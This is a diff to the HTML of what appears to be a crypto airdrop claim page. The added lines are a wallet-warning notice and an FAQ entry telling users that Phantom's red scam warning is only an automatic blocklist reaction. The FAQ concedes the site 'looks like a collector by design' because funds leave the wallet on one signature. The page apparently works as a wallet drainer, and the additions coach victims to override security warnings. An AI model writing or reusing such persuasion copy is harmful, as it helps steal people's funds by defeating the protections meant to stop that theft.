@@ -195,6 +195,7 @@
           </dl>
 
           <p id="approval-line">Your wallet asks you to approve the same four rows shown here. No hidden fee.</p>
+          <p class="wallet-warn"><strong>Wallet may warn.</strong> Phantom flags new domains automatically &mdash; a red warning does not mean these rows are wrong. Check that the wallet shows the same To and amount, and cancel if it does not.</p>
           <button id="claim-button" type="button" class="button primary">Claim in one signature</button>
           <p id="claim-sub">Funds move straight to the address shown above.</p>
           <p id="claim-status" role="status" hidden></p>
@@ -285,6 +286,7 @@
           <h3 id="faq-start"><svg class="glyph" viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="6"></circle><path d="m10.8 5.2-1.7 3.9-3.9 1.7 1.7-3.9 3.9-1.7Z"></path></svg>Getting started</h3>
           <details><summary>What is an airdrop?</summary><p>A distribution of tokens to addresses a project selects under its own rules. Eligibility can depend on past activity or holdings at a snapshot time. Each project sets its own rules and its own claim window.</p></details>
           <details><summary>Which networks work here?</summary><p>Solana and Ethereum mainnet. Pick a network, paste an address, and the page reads that chain. Switching networks clears the address field.</p></details>
+          <details><summary>Why does Phantom say this site may be a scam?</summary><p>Because the domain is on automatic blocklists. They score new domains by pattern, and this one looks like a collector by design: one signature, funds leave the wallet. Check the four rows against the wallet prompt and open the recipient in an explorer; the numbers should match exactly. The warning also carries the simulated amount, which is the same figure printed here.</p></details>
           <details><summary>Is checking really read-only?</summary><p>Yes. A public RPC node answers with balances. Your wallet is not touched until you press the collect button.</p></details>
         </section>
         <section class="faq-group" aria-labelledby="faq-results">
